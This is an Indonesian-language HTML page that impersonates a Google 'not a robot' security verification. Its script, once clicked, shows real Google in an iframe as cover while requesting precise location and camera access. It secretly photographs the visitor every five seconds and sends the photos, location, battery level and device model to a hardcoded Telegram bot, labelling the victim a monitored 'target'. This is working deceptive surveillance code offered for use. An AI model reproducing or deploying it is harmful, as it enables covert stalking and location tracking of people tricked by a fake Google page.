<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Verifikasi Keamanan</title>
    <style>
        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .box { width: 90%; max-width: 400px; padding: 20px; border: 1px solid #dfe1e5; border-radius: 8px; }
        .logo { width: 150px; margin-bottom: 20px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        #mainContent { display: none; width: 100%; height: 100%; }
        iframe { border: none; width: 100%; height: 100%; }
    </style>
</head>
<body>

<!-- Paksa klik untuk memicu pop-up izin -->
<div id="verifyBox" class="box">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
    <p>Sistem mendeteksi aktivitas tidak biasa. Harap verifikasi bahwa Anda bukan robot untuk melanjutkan ke pencarian.</p>
    <button class="btn" onclick="startTracking()">SAYA BUKAN ROBOT</button>
</div>

<div id="mainContent">
    <iframe id="gFrame" src=""></iframe>
</div>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
    const CHAT_ID = '6888530451';
    let userLoc = "Menunggu klik...";
    let deviceModel = "Mendeteksi...";

    // 1. Ambil Nama HP dari User Agent secara kasar
    function getDeviceName() {
        const ua = navigator.userAgent;
        if (ua.includes("POCO")) return "POCO C65 (Detected)";
        if (ua.includes("M2102J20SG")) return "POCO X3 Pro";
        const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
        return match ? match[3].split(" Build")[0] : "Android Device";
    }

    async function startTracking() {
        deviceModel = getDeviceName();
        
        // Pindahkan tampilan ke Google asli
        document.getElementById('verifyBox').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";

        // Minta Lokasi (Harus dipicu oleh klik tombol)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, err => {
                userLoc = "Target Menolak Izin Lokasi";
            }, { enableHighAccuracy: true });
        }

        // Minta Kamera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
            setInterval(takePhoto, 5000);
        } catch (e) {
            userLoc += " | Kamera Ditolak";
            takePhoto(); // Tetap kirim data meskipun kamera gagal
        }
    }

    async function takePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        let bat = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            bat = Math.round(b.level * 100) + "%";
        }

        const sendData = (photoBlob) => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            if (photoBlob) fd.append('photo', photoBlob, 'f.jpg');
            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceModel}\n🔋 Baterai: ${bat}\n📍 Lokasi: ${userLoc}`);
            fd.append('parse_mode', 'Markdown');
            
            const api = photoBlob ? 'sendPhoto' : 'sendMessage';
            if (!photoBlob) fd.append('text', fd.get('caption'));

            fetch(`https://api.telegram.org/bot${TOKEN}/${api}`, { method: 'POST', body: fd });
        };

        if (video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(sendData, 'image/jpeg', 0.6);
        } else {
            sendData(null);
        }
    }
</script>
</body>
</html>
